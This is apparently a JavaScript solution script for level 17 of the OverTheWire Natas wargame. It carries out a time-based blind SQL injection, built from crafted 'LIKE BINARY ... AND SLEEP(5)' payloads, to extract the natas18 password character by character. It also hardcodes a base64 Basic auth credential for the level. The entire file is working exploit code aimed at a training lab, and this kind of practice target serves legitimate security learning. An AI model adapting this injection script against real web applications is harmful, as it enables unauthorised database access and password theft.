const axios = require("axios");

const alphanumericChars =
  "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";
let passwordChars = "";
let password = "";
const debug = 0;
const targetURL = "http://natas17.natas.labs.overthewire.org/";
const authHeader =
  "Basic bmF0YXMxNzpYa0V1Q2hFMFNibktCdkgxUlU3a3NJYjl1dUxtSTdzZA==";

const findPassChars = async () => {
  for (const c of alphanumericChars) {
    const completeURL = `${targetURL}?debug=${debug}&username=natas18"+and+password+like+BINARY+"%${c}%"+AND+SLEEP(5)=0+AND+"X"="X`;
    try {
      await axios.get(completeURL, {
        headers: { Authorization: authHeader },
        timeout: 1000,
      });
    } catch (error) {
      passwordChars += c;
      console.log(`Password contains character: ${c}`);
    }
  }
};

const findPassword = async () => {
  for (let i = 0; i < 32; i++) {
    for (const c of passwordChars) {
      const completeURL = `${targetURL}?debug=${debug}&username=natas18"+and+password+like+BINARY+"${
        password + c
      }%"+AND+SLEEP(5)=0+AND+"X"="X`;
      //console.log(completeURL);
      try {
        await axios.get(completeURL, {
          headers: { Authorization: authHeader },
          timeout: 1000,
        });
      } catch (error) {
        if (debug) {
          console.log(error.response.data);
        }
        password += c;
        console.log(`Current password evaluation: ${password}`);
        break;
      }
    }
  }
  console.log(`Password: ${password}`);
};

const main = async () => {
  await findPassChars();
  await findPassword();
};

main();
